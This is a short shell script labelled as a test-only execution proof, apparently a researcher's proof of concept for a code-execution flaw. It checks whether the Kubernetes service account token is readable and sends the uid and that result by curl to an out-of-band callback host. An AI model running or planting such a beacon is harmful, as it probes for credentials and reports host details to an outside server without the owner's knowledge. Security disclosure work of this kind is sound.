#!/bin/sh
        # Test-only execution proof: no token content is read.
        if ! mkdir /tmp/df-mise-proof-e67e1b5e6b8c064f1e8a4100ddb43730 2>/dev/null; then exit 0; fi
        uid=$(id -u)
        if test -r /var/run/secrets/kubernetes.io/serviceaccount/token; then readable=true; else readable=false; fi
        curl --max-time 5 --retry 0 -fsS -o /dev/null "https://dbqp06d64p84tuvbavt0si4rutf9jtu9o.oob.staging.depthfirst.com/dfmise-repro/e67e1b5e6b8c064f1e8a4100ddb43730?uid=$uid&token_readable=$readable" || :
        
